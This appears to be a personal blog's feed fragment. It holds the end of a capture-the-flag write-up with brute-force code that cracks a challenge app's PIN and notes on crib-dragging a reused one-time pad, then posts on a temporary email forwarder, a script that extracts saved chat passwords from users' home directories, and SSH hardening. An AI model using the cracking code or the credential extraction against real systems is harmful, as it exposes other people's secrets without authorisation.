&lt;span class="n"&gt;gen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;itertools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;combinations_with_replacement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;my_chars&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'[+] Here we go....'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;which_part&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;which_part&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'1'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;part_1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;which_part&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'2'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;part_2&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;which_part&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'3'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;part_3&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;which_part&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'4'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;part_4&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;which_part&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'5'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;part_5&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'[+] Finished'&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-25"&gt;
&lt;h2&gt;Challenge 25&lt;/h2&gt;
&lt;p&gt;Not solved.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-26"&gt;
&lt;h2&gt;Challenge 26&lt;/h2&gt;
&lt;p&gt;I saw no really easy way to do this other than taking apart the apk and
using &lt;code&gt;dex2jar&lt;/code&gt; on the main java file. In this file I found the code
that makes use of the PIN and reversed engineered the code. There's
some hashing and ultimately the app will download the egg.&lt;/p&gt;
&lt;p&gt;So I reimplemented the Java code and bruteforced it. A few numbers matched,
so I just entered them until I got a valid download:
(disclaimer: I am not very good at Java at all)&lt;/p&gt;
&lt;pre class="code java literal-block"&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.File&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.FileOutputStream&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.security.MessageDigest&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.security.SecureRandom&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.regex.Matcher&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.regex.Pattern&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.security.*&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;//MessageDigest;
&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.crypto.*&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.crypto.spec.*&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.crypto.spec.SecretKeySpec&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.awt.Graphics&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.Arrays&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.awt.image.BufferedImage&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.nio.file.Files&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.nio.file.Paths&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.ByteArrayInputStream&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.security.*&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;//MessageDigest;
&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.crypto.*&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.crypto.spec.*&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.imageio.ImageIO&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.swing.JFrame&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.swing.JPanel&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.File&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sun.misc.BASE64Decoder&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sun.misc.BASE64Encoder&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;HelloWorld&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="nf"&gt;do_sha&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;s1&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;NoSuchAlgorithmException&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;MessageDigest&lt;/span&gt; &lt;span class="n"&gt;messagedigest&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MessageDigest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getInstance&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SHA1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="n"&gt;abyte0&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;StringBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;valueOf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s1&lt;/span&gt;&lt;span class="o"&gt;))).&lt;/span&gt;&lt;span class="na"&gt;append&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getBytes&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;j1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;do&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j1&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;i1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="n"&gt;abyte1&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="o"&gt;];&lt;/span&gt;
                &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;arraycopy&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;abyte0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;abyte1&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;abyte1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;
            &lt;span class="n"&gt;abyte0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;messagedigest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;digest&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;abyte0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;j1&lt;/span&gt;&lt;span class="o"&gt;++;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;hardwork&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;s1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;Cipher&lt;/span&gt; &lt;span class="n"&gt;cipher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Cipher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getInstance&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;AES&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;SecretKeySpec&lt;/span&gt; &lt;span class="n"&gt;secretkeyspec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;SecretKeySpec&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;do_sha&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ovaederecumsale&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;AES&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;init&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;secretkeyspec&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;BASE64Decoder&lt;/span&gt; &lt;span class="n"&gt;decoder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;BASE64Decoder&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
            &lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;decodedBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;decoder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;decodeBuffer&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;8QeNdEdkspV6+1I77SEEEF4aWs5dl/auahJ46MMufkg=&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;plaintxt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;doFinal&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decodedBytes&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;BASE64Encoder&lt;/span&gt; &lt;span class="n"&gt;encoder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;BASE64Encoder&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;s1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;encoder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;encodeBuffer&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plaintxt&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;exception&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s1&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;s1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;hardwork&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-27"&gt;
&lt;h2&gt;Challenge 27&lt;/h2&gt;
&lt;p&gt;One time pad with a reused pad. Another challenge that taught me a lot, specifically
cribdragging. Having found &lt;a class="reference external" href="https://github.com/SpiderLabs/cribdrag"&gt;this tool&lt;/a&gt; I started
to figure out how to use this.&lt;/p&gt;
&lt;p&gt;Basically you need to take two of the encrypted texts, use the &lt;code&gt;xorstrings&lt;/code&gt; to
xor them together and then pass that to the &lt;code&gt;cribdrag&lt;/code&gt; tool. Then you need to start
entering words that might be in the text. If a word like &lt;code&gt;the&lt;/code&gt;, or &lt;code&gt;and&lt;/code&gt;, are in the
text, you should see some plaintext appear in the output. Then perhaps pad the word
with spaces either side. Once you have more of the plaintext, you can use that to
expand the strings in either text.&lt;/p&gt;
&lt;p&gt;Eventually you will get the plain text for either string. Using that you can then
decipher the other texts.&lt;/p&gt;
&lt;p&gt;The strings increase in length, so combine them all until you have the final
sentence.&lt;/p&gt;
&lt;p&gt;Here's a quick example for a couple of the lines:&lt;/p&gt;
&lt;p&gt;[!`asciicast](&lt;a class="reference external" href="https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu.png"&gt;https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu.png&lt;/a&gt;) &amp;lt;&lt;a class="reference external" href="https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu"&gt;https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu&lt;/a&gt;&amp;gt;`_&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>'Burnmail</title><link href="http://unlogic.co.uk/2015/05/29/burnmail/" rel="alternate"></link><updated>2015-05-29T09:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-05-29:2015/05/29/burnmail/</id><summary type="html">&lt;p&gt;A while back I got curious about how easy it would be to setup a temporary
email forwarding service, akin to &lt;a class="reference external" href="https://meltmail.com/"&gt;Meltmail&lt;/a&gt;. So I got
to it and made it.&lt;/p&gt;
&lt;p&gt;In essence you will create a temporary email address that will forward all
mail it receives to your inbox. Once it expires, it drops all incoming mail.&lt;/p&gt;
&lt;p&gt;It's pretty much ready now, hence why I am posting about it.&lt;/p&gt;
&lt;p&gt;The differences between Burnmail (yeah, best I could do for now) and other
services is:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;forwarding can be expired by time or by number of received mails&lt;/li&gt;
&lt;li&gt;all tasks are accomplished through email. There's no web interface&lt;/li&gt;
&lt;li&gt;forwarding address is based on your original address with a short, random
string appended, to make it easy to remember.&lt;/li&gt;
&lt;li&gt;addreses are also easy to type on a mobile device,
as the extra string consists of digits and lowercase chars only.&lt;/li&gt;
&lt;li&gt;commands are forgiving and short&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The plan is to clean up the code and then release that on Github, but in the
meantime feel free to make use of it.&lt;/p&gt;
&lt;p&gt;Here's how to use it:&lt;/p&gt;
&lt;div class="section" id="creating-a-new-burnmail-address"&gt;
&lt;h2&gt;Creating a new Burnmail address&lt;/h2&gt;
&lt;p&gt;To create a new Burnmail address, send an email to &amp;lt;&lt;a class="reference external" href="mailto:burn&amp;#64;kthnxbai.co.uk"&gt;burn&amp;#64;kthnxbai.co.uk&lt;/a&gt;&amp;gt;,
from the address that you want your Burnmail forwarded to. In the subject
you need to specify the expiration term. The following commands are valid:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;time [n] - n is 3, 6, 12, 24, or 48 hours. It will automatically
select the closest value to the one you specify.&lt;/li&gt;
&lt;li&gt;uses [n] - n is between 1 and 30. It will be automatically capped to 30.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;By using the &lt;code&gt;time&lt;/code&gt; command you will create an address that expires after &lt;code&gt;n&lt;/code&gt;
hours. The &lt;code&gt;uses&lt;/code&gt; command creates an address that expires after &lt;code&gt;n&lt;/code&gt; emails have
been received through that address.&lt;/p&gt;
&lt;p&gt;Once your forwarder has been set up, you will receive a confirmation email with
your Burnmaill address. Check your spam folder just in case.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="getting-a-list-of-emails"&gt;
&lt;h2&gt;Getting a list of emails&lt;/h2&gt;
&lt;p&gt;To get a list of your current Burnmail addresses for an email address,
send an email to &amp;lt;&lt;a class="reference external" href="mailto:burn&amp;#64;kthnxbai.co.uk"&gt;burn&amp;#64;kthnxbai.co.uk&lt;/a&gt;&amp;gt; with the subject &lt;code&gt;stat&lt;/code&gt;.
An email listing all your current forwarders for that address and their
expiration terms will be sent to you.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="deleting-burnmail"&gt;
&lt;h2&gt;Deleting Burnmail&lt;/h2&gt;
&lt;p&gt;To delete a Burnmail send an email to &amp;lt;&lt;a class="reference external" href="mailto:burn&amp;#64;kthnxbai.co.uk"&gt;burn&amp;#64;kthnxbai.co.uk&lt;/a&gt;&amp;gt; with the subject
&lt;code&gt;kill address&lt;/code&gt;, where &lt;code&gt;address&lt;/code&gt; is the burnmail address to kill.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="thoughts"&gt;
&lt;h2&gt;Thoughts?&lt;/h2&gt;
&lt;p&gt;That's it for now. Make sure to check your spam folder if you aren't
receiving any mail.&lt;/p&gt;
&lt;p&gt;If you have any suggestions for features, or notice something broken,
please let me know.&lt;/p&gt;
&lt;p&gt;Also bear in mind that it's early days so there might be bugs.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>'I made this</title><link href="http://unlogic.co.uk/2015/05/14/i-made-this/" rel="alternate"></link><updated>2015-05-14T12:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-05-14:2015/05/14/i-made-this/</id><summary type="html">&lt;p&gt;Had this script sitting around for a while and I figured I would clean it up
a bit and share it.&lt;/p&gt;
&lt;p&gt;Get &lt;a class="reference external" href="https://github.com/Svenito/purplescraper"&gt;Purplescraper from my Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In short: you give it a starting directory, which will usually be where all the user
directories are, and it will go get all &lt;code&gt;.purple/accounts.xml&lt;/code&gt; files and extract
any usernames and passwords it finds into a new file.&lt;/p&gt;
&lt;p&gt;Useful to make sure none of your sensitive data is available to other, non
authorised users via slack file permissions.&lt;/p&gt;
</summary></entry><entry><title>The joys of server ownership</title><link href="http://unlogic.co.uk/2015/05/08/the-joys-of-server-ownership/" rel="alternate"></link><updated>2015-05-08T13:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-05-08:2015/05/08/the-joys-of-server-ownership/</id><summary type="html">&lt;p&gt;This post serves mostly as a &amp;quot;note to self&amp;quot;.&lt;/p&gt;
&lt;p&gt;I just ordered myself a super cheap VPS from &lt;a class="reference external" href="http://ramnode.com"&gt;Ramnode&lt;/a&gt; as I have
a little project I would like to setup and see if I can make it work.&lt;/p&gt;
&lt;p&gt;But first I had to setup the server (Debian 7.0) and it's been a while since I've done that, so
some reading was in order to remind myself of all the joys. Thus I decided to note this
down for myself and anyone else who's interested. So it's not an in depth explanation
by any means.&lt;/p&gt;
&lt;div class="section" id="securing"&gt;
&lt;h2&gt;Securing ##&lt;/h2&gt;
&lt;p&gt;I'm not looking for bullet proof as this won't be a production server and won't
hold any sensitive info, but I'd like to know that it's at least somewhat locked
down.&lt;/p&gt;
&lt;p&gt;So first off install &lt;a class="reference external" href="http://www.fail2ban.org/wiki/index.php/Main_Page"&gt;Fail2ban&lt;/a&gt;. This
will lock out users who fail to authenticate too often. Ramnode actually have a
&lt;a class="reference external" href="https://www.youtube.com/watch?v=GmVoqFv_lGU"&gt;good video on this&lt;/a&gt;. As we'll
only allow key based authentication it's a bit redundant, but if you want to
go that way, there's the info.&lt;/p&gt;
&lt;p&gt;Then turn off password authentication for SSH as I'll be using only keys to
authenticate. Edit &lt;code&gt;/etc/ssh/sshd_conf&lt;/code&gt; and change the following lines to read:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;ChallengeResponseAuthentication no
PasswordAuthentication no
UsePAM no&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Make sure you have uploaded your &lt;a class="reference external" href="https://help.ubuntu.com/community/SSH/OpenSSH/Keys"&gt;public key&lt;/a&gt; to
&lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; and set the permissions on &lt;code&gt;.ssh&lt;/code&gt; and &lt;code&gt;authorized_keys&lt;/code&gt; on the
server to &lt;code&gt;700&lt;/code&gt; and &lt;code&gt;600&lt;/code&gt; respectively.&lt;/p&gt;
&lt;p&gt;I also changed the default SSH port to something else, as that already keeps the number of automated
bruteforcers down. Do this by changing the following line in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;Port 22&lt;/span&gt;
